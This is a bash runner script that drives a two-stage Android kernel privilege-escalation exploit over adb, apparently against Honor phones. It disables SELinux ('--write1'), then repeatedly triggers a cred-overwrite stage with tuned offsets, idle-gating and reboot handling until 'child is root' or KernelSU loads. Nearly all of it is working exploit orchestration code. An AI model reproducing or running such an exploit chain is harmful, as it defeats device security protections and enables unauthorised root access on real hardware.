#!/bin/bash
# W2 cred-write runner (macOS-safe: no `timeout`, uses watchdog kills).
# Per boot:
#   1) W1 via --write1 (sync stamp) until SELinux Permissive
#   2) full run (SELinux off -> straight W2, GL_W2_ROUNDS=2)
# Ladder: erase fired (erase_ran=1) but uid stayed 2000 -> cred slot off by
# 8 -> GL_W2_CRED_ADJ=8 on the next boot. Coin-flip miss (no erase_ran) ->
# retry same ADJ after reboot. Success: "child is root!" / KSU ready.
# adb 挂死守护: 设备假死(adbd 挂/USB 不断)时裸 adb shell/wait-for-device
# 会无限阻塞(真机实测 "W2 ROOT ACHIEVED 后卡住" 即此类)。Git Bash 自带
# GNU timeout; macOS 无 coreutils 时退化为原行为。
T30=""; T600=""
command -v timeout >/dev/null 2>&1 && { T30="timeout 30"; T600="timeout 600"; }

# KSU 检测: 最多 2 次, 间隔 5s, 任一次命中即本 boot 已加载 —— 抗 adb 单次
# 瞬断(空响应)的假阴性, 否则会误跑 exploit 触发 slab_drain 保护性重启。
# 与 run_root.command / run_root.bat / uninstall.sh 同规则。
ksu_loaded() {
  local i
  for i in 1 2; do
    $T30 adb shell "grep -q kernelsu /proc/modules" 2>/dev/null && return 0
    [ "$i" -lt 2 ] && sleep 5
  done
  return 1
}

E="/data/local/tmp/e"
SYNC="GL_AIM_DM=1 GL_W1_ATTEMPTS=2 GL_ROUTE_ATTEMPTS=1 GL_HOLD_CHAIN=1 GL_HOLD_WAITER=1 GL_PUNCH_IN_WINDOW=1 GL_PUNCH_DELAY_USEC=0 GL_MCAST_ROUTE=1 GL_PROBE_BOOTID=0 GL_SPRAY_TEST=0 GL_STAMP_SYNC=1"

run_to() { # $1=secs $2=logfile $3...=command
  # 实时显示: 后台捕获到文件的同时 tail -f 增量回显到控制台
  # (控制台输出经 run_forever.sh 的 tee 汇入 driver log)
  local secs=$1 logf=$2; shift 2
  "$@" > "$logf" 2>&1 &
  local pid=$!
  tail -n +1 -f "$logf" 2>/dev/null &
  local tpid=$!
  # 看门狗必须: (a) stdout/stderr 重定向到 /dev/null —— 否则被 kill 后孤儿
  # sleep 持有 run_forever 的 tee 管道, FINAL 后终端假死最长 900s(实测);
  # (b) 轮询式而非 `sleep N` —— 主进程退出后 ≤2s 自行结束, 不留长命孤儿。
  ( end=$((SECONDS + secs))
    while kill -0 "$pid" 2>/dev/null && [ "$SECONDS" -lt "$end" ]; do
      sleep 2
    done
    kill "$pid" 2>/dev/null ) >/dev/null 2>&1 &
  local wd=$!
  local rc=0
  wait "$pid" || rc=$?
  kill "$wd" "$tpid" 2>/dev/null
  wait "$wd" 2>/dev/null
  wait "$tpid" 2>/dev/null
  return $rc
}

ADJ=0
# Background app storms (photos indexing, searchservice) break W1 timing.
settle() {
  $T30 adb shell "am force-stop com.hihonor.photos" 2>/dev/null
  $T30 adb shell "am force-stop com.hihonor.searchservice" 2>/dev/null
  $T30 adb shell "am kill-all" 2>/dev/null
  $T30 adb shell "pm trim-caches 999999999999" 2>/dev/null
  sleep 60 # minimum post-boot quiesce
  # Gate on REAL CPU idle (loadavg is faked by D-state ufs kworkers):
  # sample /proc/stat, require idle delta >= 85% over a 5s window.
  local i=0 a b id
  while [ $i -lt 60 ]; do
    a=$($T30 adb shell "awk '/^cpu /{print \$5+\$6}' /proc/stat" 2>/dev/null | tr -d '\r')
    sleep 5
    b=$($T30 adb shell "awk '/^cpu /{print \$5+\$6}' /proc/stat" 2>/dev/null | tr -d '\r')
    case "$a$b" in ''|*[!0-9]*) sleep 5; i=$((i+1)); continue ;; esac
    # 8 cpus * 5s * 100Hz = 4000 max idle jiffies -> pct = delta/40
    id=$(( (b - a) / 40 ))
    [ "$id" -ge 85 ] 2>/dev/null && { echo "settled: idle=${id}%"; return 0; }
    i=$((i+1))
  done
  echo "settle timeout - proceeding anyway"
}

for try in 1 2 3 4 5 6 7 8; do
  $T600 adb wait-for-device 2>/dev/null; sleep 3
  # 同 boot 已 root 守卫: kernelsu.ko 已加载 = 本 boot 提权已成功
  # (run_root [3/5] 检测被无线 adb 瞬断绕过时由此兜底)。此时再跑 W2 =
  # slab_drain 二次 fork 风暴(2000 fork, main.c:1338) -> 系统保护性
  # 重启(295 用户 18:14 实测)。凭 /proc/modules 判定, 不看 getenforce:
  # "Permissive 但无 KSU"(仅 W1 成)仍需正常重跑 W2。ksu_loaded() 内含
  # 2 次检测(间隔 5s)抗瞬断, 与入口脚本同规则。
  if ksu_loaded; then
    echo "=== KSU READY TRY $try (kernelsu already loaded this boot - skip exploit) ==="
    exit 0
  fi
  settle
  # 本 TRY 起始 boot_id: 识别 W1/W2 期间设备是否已自行重启(exploit
  # 崩溃触发保护性重启, rc=255)。已自重启的设备即新鲜 Enforcing 态,
  # 脚本无须再 reboot 一次(295 无线用户实测 w1 rc=255 后二次重启
  # 浪费一轮 + 一次手动 adb connect)。
  boot0=$($T30 adb shell "cat /proc/sys/kernel/random/boot_id" 2>/dev/null | tr -d '\r')
  en=$($T30 adb shell getenforce 2>/dev/null | tr -d '\r')
  echo "=== TRY $try ADJ=$ADJ $(date +%T) getenforce=$en ==="
  if [ "$en" != "Permissive" ]; then
    echo "--- [W1] 关闭 SELinux (--write1), 最长 420s, TRY $try ---"
    run_to 420 "w1_try$try.log" adb shell "env $SYNC $E --write1"
    echo "w1 rc=$? : $(grep -E 'SELinux DISABLED|Write 1 failed' w1_try$try.log | tail -1)"
    # W1 打出 DISABLED 后 adbd/USB 常瞬断, 单次 getenforce 空响应会把
    # 成功误判为失败白白重启(grind_reboot3 实测 10+ try 多次踩中);
    # 改为最多 6 次重试, 仅确认非 Permissive 才判失败。
    gi=0
    while [ $gi -lt 6 ]; do
      en=$($T30 adb shell getenforce 2>/dev/null | tr -d '\r')
      [ "$en" = "Permissive" ] && break
      [ -n "$en" ] && break
      gi=$((gi+1))
      sleep 10
    done
  fi
  if [ "$en" != "Permissive" ]; then
    # boot_id 变了 = 设备在 W1 期间已自行重启, 跳过脚本 reboot, 只等
    # boot 完成。boot1 读不到(设备离线)则回落原行为(reboot 对离线设备
    # 是无害 no-op, wait-for-device 等手动重连/自恢复)。
    boot1=$($T30 adb shell "cat /proc/sys/kernel/random/boot_id" 2>/dev/null | tr -d '\r')
    if [ -n "$boot1" ] && [ "$boot0" != "$boot1" ]; then
      echo "TRY $try: W1 failed (getenforce=$en) - device self-rebooted during W1, skip extra reboot"
      i=0
      while [ $i -lt 60 ]; do
        bc=$($T30 adb shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')
        [ "$bc" = "1" ] && break
        i=$((i+1)); sleep 5
      done
      sleep 10
    else
      echo "TRY $try: W1 failed (getenforce=$en) - reboot"
      $T30 adb reboot; sleep 45; $T600 adb wait-for-device; sleep 25
    fi
    continue
  fi
  # Permissive now: capture previous boot's panic via pstore/ramoops
  $T30 adb shell "ls /sys/fs/pstore/ 2>/dev/null" > "pstore_try$try.log" 2>&1
  $T30 adb shell "for f in /sys/fs/pstore/*; do echo \"=== \$f\"; cat \"\$f\" 2>/dev/null; done" >> "pstore_try$try.log" 2>&1
  # Up to 3 W2 invocations on this permissive boot: a clean miss leaves the
  # device permissive (free retry — the 02:48 miss -> 02:52 success path);
  # only a crash (device lost) or success ends the boot early.
  w2n=0
  w2done=0
  while [ $w2n -lt 3 ]; do
    w2n=$((w2n+1))
    echo "--- [W2] cred 写入 (rounds=2 ADJ=$ADJ), 第 ${w2n}/3 次, 最长 900s ---"
    run_to 900 "w2_try${try}_${w2n}.log" adb shell "env $SYNC GL_W2_ROUNDS=2 GL_W2_CRED_ADJ=$ADJ $E"
    rc=$?
    echo "w2 rc=$rc (w2 attempt $w2n) last: $(tail -2 w2_try${try}_${w2n}.log | tr '\n' ' ')"
    if grep -q "child is root" "w2_try${try}_${w2n}.log"; then
      echo "=== W2 ROOT ACHIEVED TRY $try ==="
      w2done=1
      break
    fi
    if grep -qE "KernelSU helper reports ready|KSU LOADED" "w2_try${try}_${w2n}.log"; then
      echo "=== KSU READY TRY $try ==="
      w2done=1
      break
    fi
    if grep -q "erase_ran=1" "w2_try${try}_${w2n}.log" && grep -q "child uid = 2000" "w2_try${try}_${w2n}.log" && [ "$ADJ" -lt 16 ]; then
      ADJ=$((ADJ+8)); echo "ladder: erase fired, uid 2000 -> ADJ=$ADJ next boot"
    fi
    # Device still permissive (clean miss) -> free retry; otherwise boot lost
    en=$($T30 adb shell getenforce 2>/dev/null | tr -d '\r')
    [ "$en" = "Permissive" ] || break
    echo "W2 clean miss, device still permissive - retrying W2 (attempt $((w2n+1)))"
  done
  [ "$w2done" = "1" ] && break
  # 同 W1: W2 崩溃致设备自重启时跳过冗余 reboot(boot_id 判定)
  boot1=$($T30 adb shell "cat /proc/sys/kernel/random/boot_id" 2>/dev/null | tr -d '\r')
  if [ -n "$boot1" ] && [ "$boot0" != "$boot1" ]; then
    echo "W2 attempts exhausted - device self-rebooted during W2, skip extra reboot"
    i=0
    while [ $i -lt 60 ]; do
      bc=$($T30 adb shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')
      [ "$bc" = "1" ] && break
      i=$((i+1)); sleep 5
    done
    sleep 10
  else
    $T30 adb reboot; sleep 45; $T600 adb wait-for-device; sleep 25
  fi
done
echo "=== FINAL getenforce=$($T30 adb shell getenforce 2>/dev/null | tr -d '\r') kernelsu_modules=$($T30 adb shell 'grep -c kernelsu /proc/modules 2>/dev/null' | tr -d '\r') ==="
